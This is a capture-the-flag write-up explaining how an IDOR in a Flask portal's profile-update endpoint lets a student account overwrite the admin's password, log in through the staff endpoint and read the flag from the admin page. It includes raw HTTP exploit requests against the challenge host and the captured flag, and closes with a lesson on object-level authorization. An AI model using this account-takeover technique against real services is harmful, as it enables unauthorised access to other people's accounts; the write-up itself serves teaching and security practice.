---
title: "1337 Local CTF: new intra — IDOR → Staff Login → Admin Page"
published: 2026-06-27
description: "Chaining a profile-update IDOR into staff authentication and retrieving the flag from the admin page."
tags: [1337CTF, CTF, Web, IDOR, BrokenAccessControl]
category: CTF
image: ./cover.png
draft: false
---

# new intra

## Challenge Context

The target was a Flask/Werkzeug intra-style portal with student login, staff login, profile editing, a dashboard, and admin-only pages.

## Attack Chain

```text
Register student account
  -> PUT /api/profile/1 IDOR
  -> change admin bocal's password
  -> POST /api/staff as bocal
  -> GET /admin
  -> flag
```

## Reconnaissance

Key endpoints:

| Endpoint | Purpose |
|---|---|
| `POST /api/register` | create student account |
| `POST /api/login` | student login |
| `POST /api/staff` | staff login |
| `PUT /api/profile/<id>` | profile update |
| `GET /admin` | admin page with flag |
| `GET /flag` | red herring; did not expose the final flag path |

The important bug was that `PUT /api/profile/<id>` checked that the request had a valid session, but did not check that the session user owned `<id>`.

## Vulnerability / Core Idea

This is an IDOR / Broken Object Level Authorization issue:

```text
authenticated user A can modify profile object B by changing the URL id
```

Admin users were enumerable. UID 1 was `bocal`, an admin account.

## Exploitation

1. Register a normal student account.
2. Use that student's session cookie to update UID 1:

```http
PUT /api/profile/1 HTTP/1.1
Host: 104.199.105.242:1337
Content-Type: application/json
Cookie: session=<student-session>

{"password":"REDACTED_TEST_PASSWORD"}
```

3. Authenticate through the staff endpoint, not the normal student endpoint:

```http
POST /api/staff HTTP/1.1
Host: 104.199.105.242:1337
Content-Type: application/json

{"username":"bocal","password":"REDACTED_TEST_PASSWORD"}
```

4. Visit `/admin` with the staff session.

## Flag

```text
leet{h4ck3d_b0c4l_v14_1d0r_m4ss_4ss1gn}
```

## Lesson Learned

AuthN is not AuthZ. It is not enough to verify that a user is logged in; every object-level update must verify ownership or role authorization.

---

Cover: [Wallhaven xelyx3](https://wallhaven.cc/w/xelyx3) — Serial Experiments Lain.
